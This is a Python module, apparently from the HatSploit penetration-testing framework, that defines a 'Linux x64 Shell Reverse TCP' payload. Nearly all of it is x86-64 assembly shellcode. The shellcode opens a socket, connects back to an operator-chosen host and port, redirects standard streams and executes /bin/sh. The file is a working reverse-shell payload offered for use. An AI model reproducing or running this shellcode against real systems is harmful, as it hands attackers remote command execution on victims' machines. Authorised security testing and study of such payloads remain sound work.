"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *

from pex.assembler import Assembler
from pex.socket import Socket


class HatSploitPayload(Payload, Handler, Assembler, Socket):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Linux x64 Shell Reverse TCP",
            'Payload': "linux/x64/shell_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Shell reverse TCP payload for Linux x64.",
            'Arch': "x64",
            'Platform': "linux",
            'Rank': "high",
            'Type': "reverse_tcp",
        })

    def implant(self):
        return self.assemble(
            self.details['Arch'],
            """
            start:
                push 0x3
                pop rsi

            dup:
                dec rsi
                push 0x21
                pop rax
                syscall

                jne dup
                push 0x3b
                pop rax
                cdq
                movabs rbx, 0x68732f6e69622f
                push rbx
                mov rdi, rsp
                push rdx
                push rdi
                mov rsi, rsp
                syscall
            """
        )

    def run(self):
        host = self.pack_host(self.rhost.value)
        port = self.pack_port(self.rport.value)

        return self.assemble(
            self.details['Arch'],
            f"""
            start:
                push 0x29
                pop rax
                cdq
                push 0x2
                pop rdi
                push 0x1
                pop rsi
                syscall

                xchg rdi, rax
                movabs rcx, 0x{host.hex()}{port.hex()}0002
                push rcx
                mov rsi, rsp
                push 0x10
                pop rdx
                push 0x2a
                pop rax
                syscall
            """
        ) + self.implant()
